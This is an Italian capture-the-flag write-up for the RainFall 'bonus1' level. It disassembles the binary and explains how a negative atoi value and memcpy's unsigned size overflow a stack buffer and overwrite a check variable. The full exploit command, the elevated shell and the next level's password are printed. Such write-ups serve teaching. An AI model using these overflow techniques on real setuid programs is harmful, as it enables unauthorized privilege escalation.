# Bonus 1
Controlliamo le stringhe presenti nel binario:
```
bonus1@RainFall:~$ readelf -p '.rodata' bonus1

String dump of section '.rodata':
  [     8]  sh
  [     b]  /bin/sh
```
dunque all'interno del binario viene sicuramente chiamata una funzione
che avvia la shell.
Ora controlliamo con `gdb`:
```
bonus1@RainFall:~$ gdb -q bonus1
Reading symbols from /home/user/bonus1/bonus1...(no debugging symbols found)...done.
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482d4  _init
0x08048320  memcpy
0x08048320  memcpy@plt
0x08048330  __gmon_start__
0x08048330  __gmon_start__@plt
0x08048340  __libc_start_main
0x08048340  __libc_start_main@plt
0x08048350  execl
0x08048350  execl@plt
0x08048360  atoi
0x08048360  atoi@plt
0x08048370  _start
0x080483a0  __do_global_dtors_aux
0x08048400  frame_dummy
0x08048424  main
0x080484b0  __libc_csu_init
0x08048520  __libc_csu_fini
0x08048522  __i686.get_pc_thunk.bx
0x08048530  __do_global_ctors_aux
0x0804855c  _fini
(gdb) set disassembly-flavor intel
(gdb) disass main
Dump of assembler code for function main:
   0x08048424 <+0>:     push   ebp
   0x08048425 <+1>:     mov    ebp,esp
   0x08048427 <+3>:     and    esp,0xfffffff0
   0x0804842a <+6>:     sub    esp,0x40
   0x0804842d <+9>:     mov    eax,DWORD PTR [ebp+0xc]
   0x08048430 <+12>:    add    eax,0x4
   0x08048433 <+15>:    mov    eax,DWORD PTR [eax]
   0x08048435 <+17>:    mov    DWORD PTR [esp],eax
   0x08048438 <+20>:    call   0x8048360 <atoi@plt>
   0x0804843d <+25>:    mov    DWORD PTR [esp+0x3c],eax
   0x08048441 <+29>:    cmp    DWORD PTR [esp+0x3c],0x9
   0x08048446 <+34>:    jle    0x804844f <main+43>
   0x08048448 <+36>:    mov    eax,0x1
   0x0804844d <+41>:    jmp    0x80484a3 <main+127>
   0x0804844f <+43>:    mov    eax,DWORD PTR [esp+0x3c]
   0x08048453 <+47>:    lea    ecx,[eax*4+0x0]
   0x0804845a <+54>:    mov    eax,DWORD PTR [ebp+0xc]
   0x0804845d <+57>:    add    eax,0x8
   0x08048460 <+60>:    mov    eax,DWORD PTR [eax]
   0x08048462 <+62>:    mov    edx,eax
   0x08048464 <+64>:    lea    eax,[esp+0x14]
   0x08048468 <+68>:    mov    DWORD PTR [esp+0x8],ecx
   0x0804846c <+72>:    mov    DWORD PTR [esp+0x4],edx
   0x08048470 <+76>:    mov    DWORD PTR [esp],eax
   0x08048473 <+79>:    call   0x8048320 <memcpy@plt>
   0x08048478 <+84>:    cmp    DWORD PTR [esp+0x3c],0x574f4c46
   0x08048480 <+92>:    jne    0x804849e <main+122>
   0x08048482 <+94>:    mov    DWORD PTR [esp+0x8],0x0
   0x0804848a <+102>:   mov    DWORD PTR [esp+0x4],0x8048580
   0x08048492 <+110>:   mov    DWORD PTR [esp],0x8048583
   0x08048499 <+117>:   call   0x8048350 <execl@plt>
   0x0804849e <+122>:   mov    eax,0x0
   0x080484a3 <+127>:   leave
   0x080484a4 <+128>:   ret
End of assembler dump.
```

### Funzione `main`
Riserva 0x40 (64) byte nello stack che comprende un array da 40 byte e
un intero. Successivamente viene chiamata la funzione `atoi` per tradurre
il primo argomento in un numero e controllare se è minore o uguale a 9
così da passare alla funzione `memcpy` copiando nell'array di 40 byte
il numero restituito da atoi per 4 e solo se il numero è uguale a
`0x574f4c46` abbiamo finalmente la shell.

### Soluzione
Ovviamente non possiamo scrivere il numero 0x574f4c46 perchè maggiore di
9 ma possiamo sfruttare i numeri negativi dato che comunque il segno
verrà ignorato da memcpy poichè accetta un `unsigned`.
Dunque al numero `-2147483648` aggiungiamo 1 e avremo la seguente sequenza
di bit:
```
1000 0000 0000 0000 0000 0000 0000 0001
```
ora basterà addizionare 10 per avere:
```
1000 0000 0000 0000 0000 0000 0000 1011
                                  ^----^
                                    11 * 4 = 44
```
quindi abbiamo il numero `-2147483637` come primo argomento, mentre
come secondo argomento adesso basterà scrivere 40 caratteri seguiti 
dal numero `0x574f4c46` così da sovrascrivere correttamente il numero:
```
bonus1@RainFall:~$ ./bonus1 -2147483637 $(python -c 'print "A"*40 + "\x46\x4c\x4f\x57"')
$ id
uid=2011(bonus1) gid=2011(bonus1) euid=2012(bonus2) egid=100(users) groups=2012(bonus2),100(users),2011(bonus1)
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
$ exit
bonus1@RainFall:~$ su bonus2
Password:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus2/bonus2
bonus2@RainFall:~$
```